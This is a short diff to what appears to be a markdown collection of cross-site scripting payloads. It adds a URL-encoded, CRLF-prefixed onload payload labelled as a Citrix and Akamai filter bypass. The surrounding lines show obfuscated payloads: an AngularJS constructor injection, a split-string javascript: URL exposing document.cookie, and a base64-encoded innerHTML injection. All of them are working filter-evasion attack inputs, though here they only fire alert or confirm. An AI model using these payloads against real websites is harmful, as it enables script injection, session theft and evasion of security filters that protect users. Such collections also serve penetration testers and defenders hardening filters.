@@ -248,6 +248,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %7B%7Bconstructor.constructor(%27confirm(document.domain)%27)()%7D%7D
   "><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">
   "document.body['innerHTML']=atob('PGltZyBzcmM9InRlc3RlLnBuZyIgb25lcnJvcj0iYWxlcnQod2luZG93Lm9yaWdpbikiPg==')
+  %0D%0A%0D%0A%3Cbody+x=%27&%27onload=%22(alert)(%27citrix+akamai+bypass%27)%22%3E
   ```
 </details>
 
